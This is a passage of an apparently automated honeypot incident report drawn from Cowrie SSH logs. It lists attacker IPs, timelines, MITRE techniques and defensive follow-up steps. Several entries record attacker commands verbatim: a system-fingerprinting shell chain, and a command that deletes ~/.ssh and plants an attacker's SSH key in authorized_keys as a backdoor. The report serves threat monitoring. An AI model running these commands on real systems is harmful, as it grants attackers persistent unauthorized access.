| `2026-07-05 04:19:11` | `cowrie.client.kex` |
| `2026-07-05 04:19:11` | `cowrie.login.success` |
| `2026-07-05 04:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b4042a51f0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:19 |
| **Last Seen** | 2026-07-05 04:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:19:47` | `cowrie.session.connect` |
| `2026-07-05 04:19:48` | `cowrie.client.version` |
| `2026-07-05 04:19:48` | `cowrie.client.kex` |
| `2026-07-05 04:19:51` | `cowrie.login.success` |
| `2026-07-05 04:19:54` | `cowrie.session.params` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.success` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:54` | `cowrie.command.input` |
| `2026-07-05 04:19:55` | `cowrie.log.closed` |
| `2026-07-05 04:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b51a413950

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:21 |
| **Last Seen** | 2026-07-05 04:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:21:14` | `cowrie.session.connect` |
| `2026-07-05 04:21:15` | `cowrie.client.version` |
| `2026-07-05 04:21:15` | `cowrie.client.kex` |
| `2026-07-05 04:21:18` | `cowrie.login.success` |
| `2026-07-05 04:21:20` | `cowrie.session.params` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.success` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:20` | `cowrie.command.input` |
| `2026-07-05 04:21:22` | `cowrie.log.closed` |
| `2026-07-05 04:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b89b06ab707

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:22 |
| **Last Seen** | 2026-07-05 04:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:22:43` | `cowrie.session.connect` |
| `2026-07-05 04:22:44` | `cowrie.client.version` |
| `2026-07-05 04:22:44` | `cowrie.client.kex` |
| `2026-07-05 04:22:46` | `cowrie.login.success` |
| `2026-07-05 04:22:49` | `cowrie.session.params` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.success` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:49` | `cowrie.command.input` |
| `2026-07-05 04:22:51` | `cowrie.log.closed` |
| `2026-07-05 04:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aea441fc4b1

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-05 04:24 |
| **Last Seen** | 2026-07-05 04:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:24:04` | `cowrie.session.connect` |
| `2026-07-05 04:24:04` | `cowrie.client.version` |
| `2026-07-05 04:24:04` | `cowrie.client.kex` |
| `2026-07-05 04:24:05` | `cowrie.login.success` |
| `2026-07-05 04:24:06` | `cowrie.session.params` |
| `2026-07-05 04:24:06` | `cowrie.command.input` |
| `2026-07-05 04:24:06` | `cowrie.command.failed` |
| `2026-07-05 04:24:07` | `cowrie.log.closed` |
| `2026-07-05 04:24:08` | `cowrie.session.params` |
| `2026-07-05 04:24:08` | `cowrie.command.input` |
| `2026-07-05 04:24:08` | `cowrie.session.file_download` |
| `2026-07-05 04:24:08` | `cowrie.log.closed` |
| `2026-07-05 04:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed27e3b3b48

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-05 04:24 |
| **Last Seen** | 2026-07-05 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:24:08` | `cowrie.session.connect` |
| `2026-07-05 04:24:08` | `cowrie.client.version` |
| `2026-07-05 04:24:09` | `cowrie.client.kex` |
| `2026-07-05 04:24:10` | `cowrie.login.success` |
| `2026-07-05 04:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f5d350b4b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:24 |
| **Last Seen** | 2026-07-05 04:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:24:09` | `cowrie.session.connect` |
| `2026-07-05 04:24:10` | `cowrie.client.version` |
| `2026-07-05 04:24:10` | `cowrie.client.kex` |
| `2026-07-05 04:24:13` | `cowrie.login.success` |
| `2026-07-05 04:24:14` | `cowrie.session.params` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.success` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:14` | `cowrie.command.input` |
| `2026-07-05 04:24:15` | `cowrie.log.closed` |
| `2026-07-05 04:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de709e061f1f

| Field | Detail |
|---|---|
| **Source IP** | `45.117.179[.]232` |
| **First Seen** | 2026-07-05 04:24 |
| **Last Seen** | 2026-07-05 04:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:24:10` | `cowrie.session.connect` |
| `2026-07-05 04:24:10` | `cowrie.client.version` |
| `2026-07-05 04:24:10` | `cowrie.client.kex` |
| `2026-07-05 04:24:11` | `cowrie.login.success` |
| `2026-07-05 04:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.179[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.117.179[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee84ecef6c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:25 |
| **Last Seen** | 2026-07-05 04:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:25:37` | `cowrie.session.connect` |
| `2026-07-05 04:25:37` | `cowrie.client.version` |
| `2026-07-05 04:25:37` | `cowrie.client.kex` |
| `2026-07-05 04:25:40` | `cowrie.login.success` |
| `2026-07-05 04:25:41` | `cowrie.session.params` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.success` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:41` | `cowrie.command.input` |
| `2026-07-05 04:25:42` | `cowrie.log.closed` |
| `2026-07-05 04:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357cd7d24339

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:27 |
| **Last Seen** | 2026-07-05 04:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:27:02` | `cowrie.session.connect` |
| `2026-07-05 04:27:03` | `cowrie.client.version` |
| `2026-07-05 04:27:03` | `cowrie.client.kex` |
| `2026-07-05 04:27:06` | `cowrie.login.success` |
| `2026-07-05 04:27:07` | `cowrie.session.params` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.success` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:07` | `cowrie.command.input` |
| `2026-07-05 04:27:09` | `cowrie.log.closed` |
| `2026-07-05 04:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b4d61e6e04d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:28 |
| **Last Seen** | 2026-07-05 04:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:28:26` | `cowrie.session.connect` |
| `2026-07-05 04:28:27` | `cowrie.client.version` |
| `2026-07-05 04:28:27` | `cowrie.client.kex` |
| `2026-07-05 04:28:31` | `cowrie.login.success` |
| `2026-07-05 04:28:33` | `cowrie.session.params` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.success` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:33` | `cowrie.command.input` |
| `2026-07-05 04:28:35` | `cowrie.log.closed` |
| `2026-07-05 04:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989155b446a7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 04:29 |
| **Last Seen** | 2026-07-05 04:29 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:29:42` | `cowrie.session.connect` |
| `2026-07-05 04:29:45` | `cowrie.client.version` |
| `2026-07-05 04:29:45` | `cowrie.client.kex` |
| `2026-07-05 04:29:50` | `cowrie.login.success` |
| `2026-07-05 04:29:55` | `cowrie.session.params` |
| `2026-07-05 04:29:55` | `cowrie.command.input` |
| `2026-07-05 04:29:56` | `cowrie.log.closed` |
| `2026-07-05 04:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d27092a2c43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:29 |
| **Last Seen** | 2026-07-05 04:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:29:51` | `cowrie.session.connect` |
| `2026-07-05 04:29:52` | `cowrie.client.version` |
| `2026-07-05 04:29:52` | `cowrie.client.kex` |
| `2026-07-05 04:29:56` | `cowrie.login.success` |
| `2026-07-05 04:30:00` | `cowrie.session.params` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.success` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:00` | `cowrie.command.input` |
| `2026-07-05 04:30:01` | `cowrie.log.closed` |
| `2026-07-05 04:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fa7fd2ca367

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:07` | `cowrie.session.connect` |
| `2026-07-05 04:31:07` | `cowrie.client.version` |
| `2026-07-05 04:31:07` | `cowrie.client.kex` |
| `2026-07-05 04:31:08` | `cowrie.login.success` |
| `2026-07-05 04:31:10` | `cowrie.session.params` |
| `2026-07-05 04:31:10` | `cowrie.command.input` |
| `2026-07-05 04:31:10` | `cowrie.command.failed` |
| `2026-07-05 04:31:10` | `cowrie.log.closed` |
| `2026-07-05 04:31:11` | `cowrie.session.params` |
| `2026-07-05 04:31:11` | `cowrie.command.input` |
| `2026-07-05 04:31:11` | `cowrie.session.file_download` |
| `2026-07-05 04:31:11` | `cowrie.log.closed` |
| `2026-07-05 04:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465f57f1e20d

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:12` | `cowrie.session.connect` |
| `2026-07-05 04:31:12` | `cowrie.client.version` |
| `2026-07-05 04:31:12` | `cowrie.client.kex` |
| `2026-07-05 04:31:13` | `cowrie.login.success` |
| `2026-07-05 04:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa8cc8d4a38

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-07-05 04:31 |
| **Last Seen** | 2026-07-05 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:31:14` | `cowrie.session.connect` |
| `2026-07-05 04:31:14` | `cowrie.client.version` |
| `2026-07-05 04:31:14` | `cowrie.client.kex` |
| `2026-07-05 04:31:16` | `cowrie.login.success` |
| `2026-07-05 04:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
